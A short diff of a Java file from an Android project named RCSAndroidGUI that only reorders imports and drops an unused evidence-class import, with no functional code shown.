@@ -15,8 +15,8 @@ import java.nio.ByteOrder;
 import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
-import java.util.Properties;
 import java.util.Map.Entry;
+import java.util.Properties;
 
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
@@ -26,7 +26,6 @@ import android.util.Log;
 import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.Status;
-import com.ht.RCSAndroidGUI.evidence.Evidence;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
 import com.ht.RCSAndroidGUI.util.Utils;
 import com.ht.RCSAndroidGUI.util.WChar;
